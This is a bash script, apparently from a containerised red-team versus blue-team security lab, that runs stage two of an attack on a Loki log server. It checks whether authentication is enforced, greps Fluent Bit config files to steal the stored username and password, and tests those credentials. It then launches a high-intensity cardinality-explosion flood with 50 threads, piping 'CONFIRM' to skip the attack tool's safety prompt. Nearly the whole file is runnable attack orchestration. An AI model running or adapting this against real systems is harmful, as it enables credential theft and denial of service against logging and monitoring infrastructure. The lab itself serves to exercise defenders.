#!/bin/bash

# ==========================================================================
# STAGE 02: Cardinality Explosion Attack (Phase 2: With Auth Bypass)
# ==========================================================================
# Launches the Loki cardinality attack in high-intensity mode.
# Phase 2: Scrapes credentials from local Fluent Bit config to bypass auth.
# ==========================================================================

set -e

# --- Configuration ---
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ATTACKS_DIR="$(cd "${SCRIPT_DIR}/.." && pwd)"

WEBSERVER_CONTAINER="clab-security_lab-web_server"
SIEM_CONTAINER="clab-security_lab-siem"

# Loki target
LOKI_HOST="10.10.30.2"
LOKI_PORT="3100"

# Fluent Bit config paths (where credentials are stored)
FLUENT_BIT_CONFIG="/etc/fluent-bit/fluent-bit.conf"
FLUENT_BIT_PIPELINE="/etc/fluent-bit/pipelines/ssh-logs.conf"

# Attack script
ATTACK_SCRIPT="${ATTACKS_DIR}/python-scripts/loki_cardinality_attack.py"
ATTACK_SCRIPT_CONTAINER="/tmp/loki_cardinality_attack.py"

# Attack parameters - HIGH INTENSITY
ATTACK_MODE="cardinality"
NUM_ENTRIES=10000
NUM_THREADS=50
UNIQUE_PER_BATCH=100
BATCH_SIZE=100

# Output file
ATTACK_LOG="${SCRIPT_DIR}/attack_output.log"

# --- Colors ---
RED="\033[0;31m"
GREEN="\033[0;32m"
YELLOW="\033[0;33m"
CYAN="\033[0;36m"
MAGENTA="\033[0;35m"
NC="\033[0m"

# --- Functions ---
log_stage() {
    echo ""
    echo -e "${RED}╔══════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║  STAGE 02: CARDINALITY EXPLOSION ATTACK (PHASE 2)                ║${NC}"
    echo -e "${RED}╚══════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

log_info() {
    echo -e "[$(date '+%H:%M:%S')] ${CYAN}[INFO]${NC} $1"
}

log_attack() {
    echo -e "[$(date '+%H:%M:%S')] ${RED}[ATTACK]${NC} $1"
}

log_success() {
    echo -e "[$(date '+%H:%M:%S')] ${GREEN}[OK]${NC} $1"
}

log_error() {
    echo -e "[$(date '+%H:%M:%S')] ${RED}[ERROR]${NC} $1"
}

log_phase2() {
    echo -e "[$(date '+%H:%M:%S')] ${MAGENTA}[PHASE2]${NC} $1"
}

# --- Main ---
main() {
    log_stage
    
    local start_time=$(date +%s)
    
    # Verify attack script exists
    if [ ! -f "$ATTACK_SCRIPT" ]; then
        log_error "Attack script not found: ${ATTACK_SCRIPT}"
        exit 1
    fi
    
    # Copy attack script to container
    log_info "Deploying attack script to trusted endpoint..."
    docker cp "$ATTACK_SCRIPT" "${WEBSERVER_CONTAINER}:${ATTACK_SCRIPT_CONTAINER}"
    log_success "Attack script deployed"
    
    # Ensure requests library is available
    log_info "Verifying Python dependencies..."
    docker exec "$WEBSERVER_CONTAINER" pip3 install -q requests 2>/dev/null || true
    
    # =========================================================================
    # PHASE 2: Test Authentication Enforcement
    # =========================================================================
    echo ""
    echo -e "${MAGENTA}┌─────────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${MAGENTA}│              PHASE 2: AUTHENTICATION BYPASS TEST                │${NC}"
    echo -e "${MAGENTA}└─────────────────────────────────────────────────────────────────┘${NC}"
    echo ""
    
    log_phase2 "Testing if Blue Team auth patch is in place..."
    
    # Test 1: Attempt unauthenticated access
    local unauth_result
    unauth_result=$(docker exec "$WEBSERVER_CONTAINER" curl -s -o /dev/null -w "%{http_code}" \
        "http://${LOKI_HOST}:${LOKI_PORT}/ready" 2>/dev/null || echo "000")
    
    if [ "$unauth_result" = "401" ] || [ "$unauth_result" = "403" ]; then
        log_phase2 "✓ CONFIRMED: Endpoint requires authentication (HTTP ${unauth_result})"
        log_phase2 "  Blue Team patch is ACTIVE"
    elif [ "$unauth_result" = "200" ]; then
        log_phase2 "✗ WARNING: Endpoint still unauthenticated (HTTP 200)"
        log_phase2 "  Blue Team patch may NOT be deployed"
    else
        log_phase2 "? Unexpected response: HTTP ${unauth_result}"
    fi
    
    # Test 2: Scrape credentials from local config
    echo ""
    log_phase2 "Scraping credentials from local Fluent Bit configuration..."
    
    local cred_user cred_pass
    cred_user=$(docker exec "$WEBSERVER_CONTAINER" grep -rh "http_user" /etc/fluent-bit/ 2>/dev/null | head -1 | awk '{print $2}' || echo "")
    cred_pass=$(docker exec "$WEBSERVER_CONTAINER" grep -rh "http_passwd" /etc/fluent-bit/ 2>/dev/null | head -1 | awk '{print $2}' || echo "")
    
    if [ -n "$cred_user" ] && [ -n "$cred_pass" ]; then
        log_phase2 "✓ CREDENTIALS SCRAPED SUCCESSFULLY!"
        log_phase2 "  Username: ${cred_user}"
        log_phase2 "  Password: ${cred_pass:0:4}****${cred_pass: -4}"
        
        # Test 3: Verify scraped credentials work
        local auth_result
        auth_result=$(docker exec "$WEBSERVER_CONTAINER" curl -s -o /dev/null -w "%{http_code}" \
            -u "${cred_user}:${cred_pass}" \
            "http://${LOKI_HOST}:${LOKI_PORT}/ready" 2>/dev/null || echo "000")
        
        if [ "$auth_result" = "200" ]; then
            log_phase2 "✓ AUTH BYPASS CONFIRMED: Scraped credentials are valid!"
        else
            log_phase2 "✗ Credentials rejected (HTTP ${auth_result})"
        fi
    else
        log_phase2 "✗ No credentials found in config - attempting unauthenticated attack"
    fi
    echo ""
    
    # =========================================================================
    # Display attack parameters
    # =========================================================================
    echo -e "${RED}┌─────────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${RED}│              ATTACK PARAMETERS (HIGH INTENSITY)                 │${NC}"
    echo -e "${RED}├─────────────────────────────────────────────────────────────────┤${NC}"
    printf "${RED}│${NC}  %-25s ${YELLOW}%-37s${NC} ${RED}│${NC}\n" "Target:" "${LOKI_HOST}:${LOKI_PORT}"
    printf "${RED}│${NC}  %-25s ${YELLOW}%-37s${NC} ${RED}│${NC}\n" "Attack Mode:" "${ATTACK_MODE}"
    printf "${RED}│${NC}  %-25s ${YELLOW}%-37s${NC} ${RED}│${NC}\n" "Total Entries:" "${NUM_ENTRIES}"
    printf "${RED}│${NC}  %-25s ${YELLOW}%-37s${NC} ${RED}│${NC}\n" "Parallel Threads:" "${NUM_THREADS}"
    printf "${RED}│${NC}  %-25s ${YELLOW}%-37s${NC} ${RED}│${NC}\n" "Unique Streams/Batch:" "${UNIQUE_PER_BATCH}"
    printf "${RED}│${NC}  %-25s ${YELLOW}%-37s${NC} ${RED}│${NC}\n" "Batch Size:" "${BATCH_SIZE}"
    printf "${RED}│${NC}  %-25s ${YELLOW}%-37s${NC} ${RED}│${NC}\n" "Expected Streams:" "~$((NUM_ENTRIES / BATCH_SIZE * UNIQUE_PER_BATCH))"
    printf "${RED}│${NC}  %-25s ${YELLOW}%-37s${NC} ${RED}│${NC}\n" "Auth Method:" "Scraped from Fluent Bit"
    echo -e "${RED}└─────────────────────────────────────────────────────────────────┘${NC}"
    echo ""
    
    log_attack "Launching cardinality explosion attack with scraped credentials..."
    echo ""
    
    # Build attack command - use config file to auto-scrape credentials
    local attack_cmd="python3 ${ATTACK_SCRIPT_CONTAINER} \
        --config ${FLUENT_BIT_PIPELINE} \
        -m ${ATTACK_MODE} \
        -n ${NUM_ENTRIES} \
        -t ${NUM_THREADS} \
        -u ${UNIQUE_PER_BATCH} \
        -b ${BATCH_SIZE}"
    
    # Execute attack (with auto-confirmation for cardinality mode)
    # We pipe 'CONFIRM' to auto-accept the confirmation prompt
    echo "CONFIRM" | docker exec -i "$WEBSERVER_CONTAINER" bash -c "$attack_cmd" 2>&1 | tee "$ATTACK_LOG"
    
    local attack_exit_code=${PIPESTATUS[1]}
    local end_time=$(date +%s)
    local duration=$((end_time - start_time))
    
    echo ""
    
    if [ $attack_exit_code -eq 0 ]; then
        log_success "Attack completed successfully in ${duration} seconds"
    else
        log_error "Attack failed with exit code ${attack_exit_code}"
        exit 1
    fi
    
    # Save attack metadata
    cat >> "$ATTACK_LOG" << EOF

# Attack Metadata (Phase 2)
ATTACK_DURATION_SECONDS=${duration}
ATTACK_MODE=${ATTACK_MODE}
ATTACK_ENTRIES=${NUM_ENTRIES}
ATTACK_THREADS=${NUM_THREADS}
ATTACK_UNIQUE_PER_BATCH=${UNIQUE_PER_BATCH}
UNAUTH_TEST_RESULT=${unauth_result}
SCRAPED_USER=${cred_user:-none}
AUTH_TEST_RESULT=${auth_result:-n/a}
EOF
    
    log_info "Attack log saved to: ${ATTACK_LOG}"
    echo ""
    
    # Brief pause to let Loki process the data
    log_info "Allowing 5 seconds for Loki to process ingested data..."
    sleep 5
    
    exit 0
}

main "$@"
